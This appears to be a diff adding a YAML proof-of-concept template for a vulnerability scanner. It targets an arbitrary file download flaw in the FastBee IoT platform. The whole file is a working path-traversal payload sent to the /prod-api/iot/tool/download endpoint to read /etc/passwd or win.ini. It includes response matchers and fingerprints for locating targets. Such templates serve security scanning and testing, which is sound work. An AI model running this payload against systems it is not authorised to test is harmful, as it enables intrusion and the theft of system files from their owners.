@@ -1,0 +1,23 @@
+id: poc-yaml-fastbee-download-fileread
+info:
+  name: 蜂信物联(FastBee)物联网平台download存在任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: fastbee
+  fofa: fastbee
+variables:
+  r_data_linux: '/etc/passwd
+
+    /windows/win.ini'
+firstRequest:
+  method: GET
+  path: /prod-api/iot/tool/download
+  expression: "status_code == 200 && \nbody == \"\"\n"
+requests:
+- method: GET
+  path: /prod-api/iot/tool/download?fileName=/../../../../../../../../..{{.r_data_linux}}
+  expression: "status_code == 200 &&\n(\ncontains(body, \"bit app support\") && \n\
+    contains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nmatches(body,\
+    \ \"root:.*:0:0:\")\n)\n"
+transport: http
